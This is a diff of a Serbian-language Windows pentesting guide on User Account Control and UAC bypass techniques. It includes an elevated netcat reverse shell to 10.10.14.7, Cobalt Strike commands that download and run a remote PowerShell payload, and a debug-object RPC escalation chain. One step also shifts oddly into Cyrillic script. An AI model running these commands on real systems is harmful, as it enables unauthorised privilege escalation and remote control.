@@ -1,61 +1,62 @@
-# UAC - User Account Control
+# UAC - Kontrola korisničkog naloga
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za saglasnost za aktivnosti sa povišenim privilegijama**. Aplikacije imaju različite nivoe `integrity`, a program sa **visokim nivoom** može da izvršava zadatke koji bi **potencijalno mogli da ugroze sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **izvršavaju u bezbednosnom kontekstu naloga koji nije administrator** osim ako administrator izričito ne odobri da te aplikacije/zadaci imaju pristup sistemu na nivou administratora radi izvršavanja. To je funkcija pogodnosti koja štiti administratore od nenamernih izmena, ali se ne smatra bezbednosnom granicom.<sup>[[2]](#references)</sup>
+[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za potvrdu pri aktivnostima koje zahtevaju povišene privilegije**. Aplikacije imaju različite nivoe `integrity`, a program sa **visokim nivoom** može da izvršava zadatke koji **potencijalno mogu da ugroze sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **izvršavaju u bezbednosnom kontekstu naloga koji nije administratorski**, osim ako administrator izričito ne odobri tim aplikacijama/zadacima administratorski pristup sistemu radi izvršavanja. To je praktična funkcija koja štiti administratore od nenamernih izmena, ali se ne smatra bezbednosnom granicom.<sup>[[2]](#references)</sup>
 
-Za više informacija o nivoima integriteta:
+Više informacija o nivoima integriteta:
 
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Kada je UAC aktivan, korisniku administratoru se dodeljuju 2 tokena: token standardnog korisnika, za obavljanje uobičajenih radnji na srednjem nivou integriteta, i token sa administratorskim privilegijama.
+Kada je UAC aktivan, administratorski korisnik dobija 2 tokena: standardni korisnički token za uobičajene radnje na srednjem nivou integriteta i token sa administratorskim privilegijama.
 
-Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) veoma detaljno objašnjava kako UAC funkcioniše i obuhvata proces prijavljivanja, korisničko iskustvo i UAC arhitekturu.<sup>[[2]](#references)</sup> Administratori mogu da koriste bezbednosne politike za konfigurisanje načina rada UAC-a specifičnog za njihovu organizaciju na lokalnom nivou (pomoću secpol.msc), ili da ga konfigurišu i distribuiraju putem Group Policy Objects (GPO) u Active Directory domenskom okruženju. Različita podešavanja detaljno su razmotrena [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Za UAC se može podesiti 10 Group Policy podešavanja. Sledeća tabela pruža dodatne informacije:
+Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC funkcioniše i obuhvata proces prijavljivanja, korisničko iskustvo i UAC arhitekturu.<sup>[[2]](#references)</sup> Administratori mogu da koriste bezbednosne smernice za konfiguraciju načina rada UAC-a u svojoj organizaciji, lokalno (pomoću secpol.msc) ili konfiguracijom i primenom putem objekata grupnih smernica (GPO) u Active Directory domenskom okruženju. Različita podešavanja su detaljno opisana [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Za UAC se može podesiti 10 postavki grupnih smernica. Sledeća tabela sadrži dodatne pojedinosti:
 
-| Group Policy podešavanje                                                                                                                                                                                                                                                                                                                                                           | Registry ključ                | Podrazumevano podešavanje                                              |
+| Postavka grupnih smernica                                                                                                                                                                                                                                                                                                                                                           | Ključ registratora                | Podrazumevana postavka                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Onemogućeno)                                             |
-| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zahtev za saglasnost za ne-Windows binarne datoteke na bezbednoj radnoj površini) |
-| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Zahtev za akreditive na bezbednoj radnoj površini)         |
-| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Omogućeno; podrazumevano onemogućeno u izdanju Enterprise)           |
-| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Onemogućeno)                                             |
-| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Omogućeno)                                              |
-| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Omogućeno)                                              |
-| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Onemogućeno)                                             |
-| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Omogućeno)                                              |
-| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Omogućeno)                                              |
+| [Kontrola korisničkog naloga: režim odobravanja administratora za ugrađeni administratorski nalog](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Onemogućeno)                                             |
+| [Kontrola korisničkog naloga: ponašanje zahteva za potvrdu povišenih privilegija za administratore u režimu odobravanja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zahtev za potvrdu za binarne datoteke koje nisu iz Windows-a na bezbednoj radnoj površini) |
+| [Kontrola korisničkog naloga: ponašanje zahteva za povišene privilegije za standardne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Zahtev za akreditive na bezbednoj radnoj površini)         |
+| [Kontrola korisničkog naloga: otkrivanje instalacija aplikacija i zahtev za povišene privilegije](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Omogućeno; podrazumevano onemogućeno u izdanju Enterprise)           |
+| [Kontrola korisničkog naloga: dozvoli povišene privilegije samo za potpisane i validirane izvršne datoteke](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Onemogućeno)                                             |
+| [Kontrola korisničkog naloga: dozvoli povišene privilegije samo za UIAccess aplikacije instalirane na bezbednim lokacijama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Omogućeno)                                              |
+| [Kontrola korisničkog naloga: pokreni sve administratore u režimu odobravanja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Omogućeno)                                              |
+| [Kontrola korisničkog naloga: dozvoli UIAccess aplikacijama da zahtevaju povišene privilegije bez korišćenja bezbedne radne površine](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Onemogućeno)                                             |
+| [Kontrola korisničkog naloga: pređi na bezbednu radnu površinu prilikom zahteva za povišene privilegije](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Omogućeno)                                              |
+| [Kontrola korisničkog naloga: virtuelizuj neuspele upise datoteka i registratora na lokacije specifične za korisnika](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Omogućeno)                                              |
 
-### Politike za instaliranje softvera na Windows-u
+### Smernice za instaliranje softvera u Windows-u
 
-**lokalne bezbednosne politike** ("secpol.msc" na većini sistema) podrazumevano su konfigurisane tako da **spreče korisnike koji nisu administratori da instaliraju softver**. To znači da, čak i ako korisnik koji nije administrator može da preuzme installer za vaš softver, neće moći da ga pokrene bez administratorskog naloga.
+**Lokalne bezbednosne smernice** (u većini sistema „secpol.msc“) podrazumevano su podešene tako da **spreče korisnike koji nisu administratori da instaliraju softver**. To znači da, čak i ako korisnik koji nije administrator može da preuzme instalacioni program za vaš softver, neće moći da ga pokrene bez administratorskog naloga.
 
-### Registry ključevi za prisiljavanje UAC-a da zahteva povišene privilegije
+### Ključevi registratora za obavezivanje UAC-a da zatraži povišene privilegije
 
-Kao standardni korisnik bez administratorskih prava, možete da obezbedite da se od "standardnog" naloga **zahtevaju akreditive putem UAC-a** kada pokuša da izvrši određene radnje. Za ovu radnju potrebno je izmeniti određene **registry ključeve**, za šta su vam potrebne administratorske dozvole, osim ako postoji **UAC bypass**, ili je napadač već prijavljen kao administrator.
+Kao standardni korisnik bez administratorskih prava, možete da podesite da UAC **zatraži akreditive od „standardnog“ naloga** kada pokuša da izvrši određene radnje. Za to je potrebno izmeniti određene **ključeve registratora**, za šta su vam potrebne administratorske dozvole, osim ako postoji **UAC bypass** ili je napadač već prijavljen kao administrator.
 
-Čak i ako se korisnik nalazi u grupi **Administrators**, ove izmene prisiljavaju korisnika da **ponovo unese akreditive svog naloga** kako bi izvršio administratorske radnje.
+Čak i ako je korisnik u grupi **Administrators**, ove izmene primoravaju korisnika da **ponovo unese akreditive svog naloga** da bi izvršio administrativne radnje.
 
-**U praksi je ovo korisno samo kada već imate povišeni token, UAC bypass ili pogrešnu konfiguraciju koja vam omogućava da menjate ove ključeve; u suprotnom je sam upis u registry blokiran.**
+**U praksi, ovo je korisno samo ako već imate token sa povišenim privilegijama, UAC bypass ili pogrešnu konfiguraciju koja vam omogućava da izmenite ove ključeve; u suprotnom, upis u registrator biće blokiran.**
 
-Registry ključevi i stavke koje morate da izmenite su sledeći (sa njihovim podrazumevanim vrednostima u zagradama):
+Ključevi i unosi registratora koje treba izmeniti su sledeći (podrazumevane vrednosti su u zagradama):
 
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
-- `ConsentPromptBehaviorUser` = 1 (3)
-- `ConsentPromptBehaviorAdmin` = 1 (5)
-- `PromptOnSecureDesktop` = 1 (1)
+  - `ConsentPromptBehaviorUser` = 1 (3)
+  - `ConsentPromptBehaviorAdmin` = 1 (5)
+  - `PromptOnSecureDesktop` = 1 (1)
 
-Ovo se može uraditi i ručno pomoću alata Local Security Policy. Nakon izmene, administratorske operacije zahtevaju od korisnika da ponovo unese svoje akreditive.
+Ovo se može uraditi i ručno pomoću alata Local Security Policy. Nakon izmene, administrativne operacije traže od korisnika da ponovo unese svoje akreditive.
 
 ### Napomena
 
-**User Account Control nije bezbednosna granica.** Zbog toga standardni korisnici ne mogu da izađu iz svojih naloga i steknu administratorska prava bez lokalnog privilege escalation exploita.
+**Kontrola korisničkog naloga nije bezbednosna granica.** Zato standardni korisnici ne mogu da izađu iz svojih naloga i dobiju administratorska prava bez lokalnog exploit-a za eskalaciju privilegija.
 
-### Zatražite od korisnika „potpun pristup računaru“
+### Zatražiti od korisnika „potpun pristup računaru“
+
 ```powershell
 hostname | Set-Clipboard
 Enable-PSRemoting -SkipNetworkProfileCheck -Force
@@ -64,36 +65,38 @@ cd C:\Users\hacedorderanas\Desktop
 New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
 Enter-PSSession -ComputerName hostname
 ```
+
 ### UAC privilegije
 
-- Internet Explorer Protected Mode koristi provere integriteta kako bi sprečio procese sa visokim nivoom integriteta (kao što su web pregledači) da pristupaju podacima sa niskim nivoom integriteta (kao što je fascikla sa privremenim Internet datotekama). To se postiže pokretanjem pregledača sa tokenom niskog nivoa integriteta. Kada pregledač pokuša da pristupi podacima uskladištenim u zoni niskog integriteta, operativni sistem proverava nivo integriteta procesa i u skladu s tim dozvoljava pristup. Ova funkcija pomaže u sprečavanju napada daljinskog izvršavanja koda da dobiju pristup osetljivim podacima na sistemu.
-- Kada se korisnik prijavi na Windows, sistem kreira access token koji sadrži listu privilegija korisnika. Privilegije su definisane kao kombinacija prava i mogućnosti korisnika. Token takođe sadrži listu akreditiva korisnika, odnosno akreditiva koji se koriste za autentifikaciju korisnika na računaru i pristup resursima na mreži.
+- Internet Explorer Protected Mode koristi provere integriteta kako bi sprečio procese sa visokim nivoom integriteta (kao što su veb-pregledači) da pristupaju podacima sa niskim nivoom integriteta (kao što je fascikla sa privremenim internet datotekama). To se postiže pokretanjem pregledača sa tokenom niskog integriteta. Kada pregledač pokuša da pristupi podacima sačuvanim u zoni niskog integriteta, operativni sistem proverava nivo integriteta procesa i u skladu s tim dozvoljava pristup. Ova funkcija pomaže u sprečavanju napada daljinskim izvršavanjem koda da pristupe osetljivim podacima na sistemu.
+- Kada se korisnik prijavi u Windows, sistem kreira token za pristup koji sadrži listu korisnikovih privilegija. Privilegije su definisane kao kombinacija korisnikovih prava i mogućnosti. Token sadrži i listu korisnikovih akreditiva, koji se koriste za autentifikaciju korisnika na računaru i pristup resursima na mreži.
 
 ### Autoadminlogon
 
-Da biste konfigurisali Windows tako da se određeni korisnik automatski prijavljuje prilikom pokretanja sistema, podesite **`AutoAdminLogon` registry key**. Ovo je korisno u kiosk okruženjima ili za potrebe testiranja. Koristite ovo samo na bezbednim sistemima, jer se lozinka izlaže u registry-ju.
+Da biste podesili Windows da automatski prijavi određenog korisnika pri pokretanju, postavite **`AutoAdminLogon` registry key**. Ovo je korisno u okruženjima sa kioscima ili za potrebe testiranja. Koristite ovo samo na bezbednim sistemima jer se lozinka izlaže u registru.
 
-Podesite sledeće ključeve pomoću Registry Editor-a ili komande `reg add`:
+Podesite sledeće ključeve pomoću Registry Editor-a ili `reg add`:
 
 - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
-- `AutoAdminLogon` = 1
-- `DefaultUsername` = username
-- `DefaultPassword` = password
+  - `AutoAdminLogon` = 1
+  - `DefaultUsername` = username
+  - `DefaultPassword` = password
 
-Da biste vratili uobičajeno ponašanje pri prijavljivanju, podesite `AutoAdminLogon` na 0.
+Da biste vratili uobičajeno ponašanje pri prijavljivanju, postavite `AutoAdminLogon` na 0.
 
 ## UAC bypass
 
 > [!TIP]
-> Imajte na umu da je, ako imate grafički pristup žrtvinom sistemu, UAC bypass jednostavan, jer možete samo da kliknete na „Yes“ kada se pojavi UAC prompt.
+> Imajte na umu da je UAC bypass jednostavan ako imate grafički pristup žrtvi, jer možete jednostavno da kliknete na „Yes“ kada se pojavi UAC prompt.
 
-UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces se izvršava u kontekstu srednjeg nivoa integriteta, a vaš korisnik pripada administratorskoj grupi**.
+UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces radi u kontekstu srednjeg nivoa integriteta, a vaš korisnik pripada administratorskoj grupi**.
 
-Važno je napomenuti da je **UAC mnogo teže zaobići ako je podešen na najviši nivo bezbednosti (Always) nego ako je podešen na bilo koji od drugih nivoa (Default).**
+Važno je napomenuti da je **mnogo teže zaobići UAC kada je podešen na najviši nivo bezbednosti (Always) nego kada je podešen na bilo koji drugi nivo (Default).**
 
-### Brza trijaža iz shell-a srednjeg nivoa integriteta
+### Brza trijaža iz shell-a sa srednjim nivoom integriteta
 
-Pre nego što pokušate bypass, potvrdite da se nalazite u odgovarajućoj situaciji i povežite build hosta sa poznatim metodama koje funkcionišu:
+Pre nego što pokušate bypass, potvrdite da ste u odgovarajućoj situaciji i utvrdite verziju hosta kako biste pronašli poznate metode koje rade:
+
 ```powershell
 whoami /groups
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
@@ -102,44 +105,48 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Prom
 powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
 schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
 ```
+
 Praktične napomene:
-- Ako je `EnableLUA=0`, bypass nije potreban: bilo koji admin token može direktno da zatraži high integrity.
-- `ConsentPromptBehaviorAdmin=2` ili `5` predstavlja uobičajen scenario za auto-elevate / COM-based bypasses.
-- `Always Notify` podiže nivo zaštite, ali i dalje treba testirati konkretnu verziju umesto pretpostavljanja da neće uspeti: UACME i dalje prati neke metode kompatibilne sa `AlwaysNotify` na modernim Windows buildovima.<sup>[[3]](#references)</sup>
+- Ako je `EnableLUA=0`, zaobilazno rešenje nije potrebno: svaki administratorski token može direktno da zatraži visok nivo integriteta.
+- `ConsentPromptBehaviorAdmin=2` ili `5` je uobičajen scenario za auto-elevate / COM-based bypasses.
+- `Always Notify` podiže lestvicu, ali ipak testirajte konkretnu verziju umesto da pretpostavite da neće uspeti: UACME i dalje prati neke metode kompatibilne sa `AlwaysNotify` na modernim verzijama Windows-a.<sup>[[3]](#references)</sup>
 
-### UAC disabled
+### UAC je onemogućen
 
-Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **izvršiti reverse shell sa admin privilegijama** (high integrity level) koristeći nešto poput:
+Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **da pokrenete reverse shell sa administratorskim privilegijama** (visok nivo integriteta) koristeći nešto poput:
+
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-#### UAC bypass with token duplication
+
+#### UAC bypass sa dupliciranjem tokena
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### Local RPC + reusable debug object
+### Lokalni RPC + ponovo upotrebljiv debug objekat
 
-AppInfo local RPC interfejs `201ef99a-7fa0-444c-9399-19ba84f12a1a` može da kreira proces sa omogućenim debugging-om. Procesi kreirani za debugging na istoj niti dele debug object te niti; debug događaj kreiranja sadrži process handle sa potpunim pristupom čak i kada sam RPC rezultat daje samo ograničen pristup. Ovo pretvara ponovno korišćenje debug object-a u UAC primitivu za člana grupe Administrators sa srednjim nivoom integriteta.<sup>[[11]](#references)[[12]](#references)</sup>
+Lokalni RPC interfejs AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` može da kreira proces sa omogućenim debuggingom. Procesi kreirani uz debugging na istoj niti dele debug objekat te niti; događaj kreiranja sadrži handle procesa sa punim pristupom, čak i kada RPC rezultat daje samo ograničen pristup. Tako ponovna upotreba debug objekta postaje UAC primitiva za člana grupe Administrators sa srednjim nivoom integriteta.<sup>[[11]](#references)[[12]](#references)</sup>
 
-Praktičan chain je:<sup>[[11]](#references)[[12]](#references)</sup>
+Praktičan niz koraka je:<sup>[[11]](#references)[[12]](#references)</sup>
 
-1. Pozovite lokalni RPC metod (direktno ili preko `NdrAsyncClientCall`) da biste kreirali sacrificial proces koji nije elevated, sa omogućenim debugging-om.
-2. Izvršite upit za `ProcessDebugObjectHandle` pomoću `NtQueryInformationProcess`, odvojite ga pomoću `NtRemoveProcessDebug`, zadržite object i terminirajte sacrificial proces.
-3. Koristite isti RPC interfejs da kreirate trusted auto-elevated proces, a zatim povežite sačuvani object sa calling thread-om pomoću `DbgUiSetThreadDebugObject`.
-4. Pozovite `WaitForDebugEvent` i preuzmite process handle iz `CREATE_PROCESS_DEBUG_EVENT`; duplicirajte ga pomoću `NtDuplicateObject` pre nego što nastavite.
-5. Prosledite duplicirani handle funkciji `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` i pokrenite payload pomoću extended startup-info strukture. Ovo istovremeno ponovo koristi context elevated procesa i daje child procesu relationship sa parent procesom koji izgleda kao trusted.
+1. Pozovite lokalnu RPC metodu (direktno ili preko `NdrAsyncClientCall`) da biste kreirali žrtveni proces koji nije podignut, uz omogućen debugging.
+2. Upitom za `ProcessDebugObjectHandle` pomoću `NtQueryInformationProcess` pribavite objekat, odvojite ga pomoću `NtRemoveProcessDebug`, sačuvajte ga i prekinite žrtveni proces.
+3. Upotrebite isti RPC interfejs da biste kreirali pouzdan, automatski podignut proces, a zatim povežite sačuvani objekat sa pozivajućom niti preko `DbgUiSetThreadDebugObject`.
+4. Pozovite `WaitForDebugEvent` i preuzmite handle procesa `CREATE_PROCESS_DEBUG_EVENT`; duplicirajte ga pomoću `NtDuplicateObject` пре него што наставите.
+5. Prosledite duplicirani handle funkciji `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` i pokrenite payload pomoću proširene strukture startup-info. Time se ponovo koristi kontekst podignutog procesa, a dete dobija odnos sa roditeljem koji izgleda pouzdano.
 
-Tražite kratku sekvencu, a ne samo auto-elevated binary: kreiranje procesa preko lokalnog AppInfo RPC-a, upite za `ProcessDebugObjectHandle`, odvajanje/ponovno povezivanje debugger-a, neposredni creation-debug event, dupliciranje handle-a i child čiji recorded parent nije isti kao proces koji je izvršio creation API-je.<sup>[[12]](#references)</sup>
+Tražite kratku sekvencu, a ne samo automatski podignutu binarnu datoteku: kreiranje procesa preko lokalnog AppInfo RPC-a, upite za `ProcessDebugObjectHandle`, odvajanje/ponovno povezivanje debagera, neposredni događaj debugovanja pri kreiranju, dupliciranje handle-a i dete čiji zabeleženi roditeljski proces ne odgovara procesu koji je pozvao API-je za kreiranje.<sup>[[12]](#references)</sup>
 
-### **Very** Basic UAC "bypass" (full file system access)
+### **Veoma** osnovni UAC „bypass“ (pun pristup sistemu datoteka)
 
-Ako imate shell sa korisnikom koji se nalazi u grupi Administrators, možete **mount-ovati C$** share preko SMB-a (file system) lokalno na novom disku i imaćete **access to everything inside the file system** (čak i do Administrator home folder-a).
+Ako imate shell sa korisnikom koji pripada grupi Administrators, možete lokalno da **montirate deljeni resurs C$** preko SMB-a (sistema datoteka) na novi disk i imaćete **pristup svemu u sistemu datoteka** (čak i matičnoj fascikli Administratora).
 
 > [!WARNING]
-> **Izgleda da ovaj trik više ne radi**
+> **Izgleda da ovaj trik više ne funkcioniše**
+
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -147,9 +154,11 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
-### UAC bypass with cobalt strike
 
-Cobalt Strike tehnike će funkcionisati samo ako UAC nije podešen na maksimalni nivo bezbednosti.
+### Zaobilaženje UAC-a pomoću Cobalt Strike-a
+
+Tehnike za Cobalt Strike funkcionisaće samo ako UAC nije podešen na najviši nivo bezbednosti.
+
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -161,27 +170,29 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
+
 **Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC-a**.
 
-### Elevated COM interfejsi (`ICMLuaUtil` / `CMSTPLUA`)
+### Elevirani COM interfejsi (`ICMLuaUtil` / `CMSTPLUA`)
 
-Auto-elevated COM objekti i dalje predstavljaju praktičnu UAC površinu na modernim buildovima. `ICMLuaUtil` se i dalje vodi u UACME-u kao funkcionalan na aktuelnim Windows granama, a offensive alati nastavljaju da prilagođavaju `CMSTPLUA` kombinovanjem procesa na interaktivnom desktopu, 64-bitnog izvršavanja i ponekad PEB/process masquerading-a pre pozivanja COM Elevation Moniker-a.<sup>[[3]](#references)</sup>
+Auto-elevirani COM objekti i dalje predstavljaju praktičnu UAC površinu napada na novijim verzijama sistema. UACME i dalje beleži da `ICMLuaUtil` radi na aktuelnim granama Windowsa, a ofanzivni alati nastavljaju da prilagođavaju `CMSTPLUA` kombinovanjem procesa sa interaktivnom radnom površinom, 64-bitnog izvršavanja i, ponekad, lažiranja PEB-a/procesa pre pozivanja COM Elevation Moniker-a.<sup>[[3]](#references)</sup>
 
 Praktični saveti:
-- Dajte prednost **64-bitnom** procesu u korisnikovoj **interaktivnoj sesiji** (najčešće `explorer.exe` ili njegovom child procesu).
-- Ako raw shell ne uspe, pokušajte ponovo iz BOF / UACME implementacije umesto naivnog `CreateProcess` wrapper-a.
-- Očekujte da se child izvršavanje odvija u **zasebnom elevated procesu**; mnogi BOF-ovi ne eleviraju trenutni beacon in-place.
+- Dajte prednost **64-bitnom** procesu u korisnikovoj **interaktivnoj sesiji** (najčešće `explorer.exe` ili njegovom podređenom procesu).
+- Ako obična shell komanda ne uspe, pokušajte ponovo iz BOF / UACME implementacije umesto preko naivnog `CreateProcess` omotača.
+- Očekujte da se podređeni proces pokrene kao **zaseban elevirani proces**; mnogi BOF-ovi ne eleviraju postojeći beacon u mestu.
 
 ### KRBUACBypass
 
